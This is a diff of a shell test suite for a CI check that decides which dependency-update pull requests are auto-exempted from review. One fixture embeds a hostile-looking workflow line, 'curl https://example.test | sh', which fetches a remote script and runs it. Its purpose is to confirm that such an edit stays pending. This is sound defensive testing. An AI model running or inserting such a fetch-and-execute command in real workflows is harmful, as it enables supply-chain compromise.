@@ -767,53 +767,75 @@ file_row() { jq -cn --arg f "$1" --arg s "${2:-modified}" --arg p "${3:-@@ -1 +1
 
 f="$(exempt_case bump)"
 file_row Cargo.lock >"$f/files.jsonl"
-crate serde 1.0.1 >"$f/base123/Cargo.lock"; crate serde 1.0.2 >"$f/head123/Cargo.lock"
-run_exempt "$f" head123 "a version bump"; assert_exempt "$f" success "a version bump"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a version bump"
+assert_exempt "$f" success "a version bump"
 
 f="$(exempt_case new-crate)"
 file_row Cargo.lock >"$f/files.jsonl"
-crate serde 1.0.1 >"$f/base123/Cargo.lock"; { crate serde 1.0.2; crate evil 0.1.0; } >"$f/head123/Cargo.lock"
-run_exempt "$f" head123 "a new crate"; assert_exempt "$f" pending "a new crate"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+{
+    crate serde 1.0.2
+    crate evil 0.1.0
+} >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a new crate"
+assert_exempt "$f" pending "a new crate"
 
 f="$(exempt_case git-source)"
 file_row Cargo.lock >"$f/files.jsonl"
-crate serde 1.0.1 >"$f/base123/Cargo.lock"; crate serde 1.0.2 "git+https://example.test/serde" >"$f/head123/Cargo.lock"
-run_exempt "$f" head123 "a non-crates.io source"; assert_exempt "$f" pending "a non-crates.io source"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 "git+https://example.test/serde" >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a non-crates.io source"
+assert_exempt "$f" pending "a non-crates.io source"
 
 f="$(exempt_case outside)"
-{ file_row Cargo.lock; file_row crates/pixtuoid/src/main.rs; } >"$f/files.jsonl"
-crate serde 1.0.1 >"$f/base123/Cargo.lock"; crate serde 1.0.2 >"$f/head123/Cargo.lock"
-run_exempt "$f" head123 "a file outside the manifests"; assert_exempt "$f" pending "a file outside the manifests"
+{
+    file_row Cargo.lock
+    file_row crates/pixtuoid/src/main.rs
+} >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a file outside the manifests"
+assert_exempt "$f" pending "a file outside the manifests"
 
 f="$(exempt_case removed)"
 file_row requirements-dev.txt removed >"$f/files.jsonl"
-run_exempt "$f" head123 "a removed manifest"; assert_exempt "$f" pending "a removed manifest"
+run_exempt "$f" head123 "a removed manifest"
+assert_exempt "$f" pending "a removed manifest"
 
 f="$(exempt_case uses-pin)"
 file_row .github/workflows/ci.yml modified $'@@ -9 +9 @@\n-      - uses: actions/checkout@aaa # v6\n+      - uses: actions/checkout@bbb # v7' >"$f/files.jsonl"
-run_exempt "$f" head123 "a uses: pin"; assert_exempt "$f" success "a uses: pin"
+run_exempt "$f" head123 "a uses: pin"
+assert_exempt "$f" success "a uses: pin"
 
 f="$(exempt_case workflow-edit)"
 file_row .github/workflows/ci.yml modified $'@@ -9 +9,2 @@\n-      - uses: actions/checkout@aaa # v6\n+      - uses: actions/checkout@bbb # v7\n+        run: curl https://example.test | sh' >"$f/files.jsonl"
-run_exempt "$f" head123 "a workflow edit beyond a pin"; assert_exempt "$f" pending "a workflow edit beyond a pin"
+run_exempt "$f" head123 "a workflow edit beyond a pin"
+assert_exempt "$f" pending "a workflow edit beyond a pin"
 
 f="$(exempt_case install-script)"
 file_row site/package-lock.json >"$f/files.jsonl"
 mkdir -p "$f/base123/site" "$f/head123/site"
 jq -n '{packages: {"": {}, "node_modules/a": {version: "1.0.0", resolved: "https://registry.npmjs.org/a/-/a-1.0.0.tgz"}}}' >"$f/base123/site/package-lock.json"
 jq -n '{packages: {"": {}, "node_modules/a": {version: "1.0.1", resolved: "https://registry.npmjs.org/a/-/a-1.0.1.tgz", hasInstallScript: true}}}' >"$f/head123/site/package-lock.json"
-run_exempt "$f" head123 "a new install script"; assert_exempt "$f" pending "a new install script"
+run_exempt "$f" head123 "a new install script"
+assert_exempt "$f" pending "a new install script"
 
 f="$(exempt_case pushed-on)"
 file_row Cargo.lock >"$f/files.jsonl"
-crate serde 1.0.1 >"$f/base123/Cargo.lock"; crate serde 1.0.2 >"$f/head123/Cargo.lock"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 >"$f/head123/Cargo.lock"
 jq -cn '{author: "someone", committer: "someone", verified: false}' >>"$f/commits.jsonl"
-run_exempt "$f" head123 "a commit pushed onto the branch"; assert_exempt "$f" pending "a commit pushed onto the branch"
+run_exempt "$f" head123 "a commit pushed onto the branch"
+assert_exempt "$f" pending "a commit pushed onto the branch"
 
 f="$(exempt_case moved)"
 file_row Cargo.lock >"$f/files.jsonl"
-crate serde 1.0.1 >"$f/base123/Cargo.lock"; crate serde 1.0.2 >"$f/head123/Cargo.lock"
-run_exempt "$f" newer456 "a head that moved"; assert_exempt "$f" pending "a head that moved"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 >"$f/head123/Cargo.lock"
+run_exempt "$f" newer456 "a head that moved"
+assert_exempt "$f" pending "a head that moved"
 
 # ── The reviewer's round: this lens's published reviews so far, plus one.
 round_script="$(workflow_step_script .github/workflows/claude-readonly-review.yml "Count this lens's rounds")"
